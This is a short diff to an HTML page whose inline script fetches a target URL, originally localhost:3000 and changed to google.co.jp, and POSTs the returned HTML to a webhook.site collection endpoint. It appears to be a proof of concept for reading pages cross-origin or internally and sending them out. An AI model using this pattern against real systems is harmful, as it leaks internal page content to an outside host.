@@ -4,7 +4,7 @@
 <body>
 <script>
 (async () => {
-  const target = "http://localhost:3000/";
+  const target = "http://www.google.co.jp/"; //"http://localhost:3000/";
   try { const html = await fetch(target).then(r => r.text());
   await fetch("https://webhook.site/68d0f25e-49c3-43e2-954e-d0e587510352", {
     method: "POST",
@@ -15,6 +15,7 @@
 </script>
 </body>
 </html>
+
 
 
 
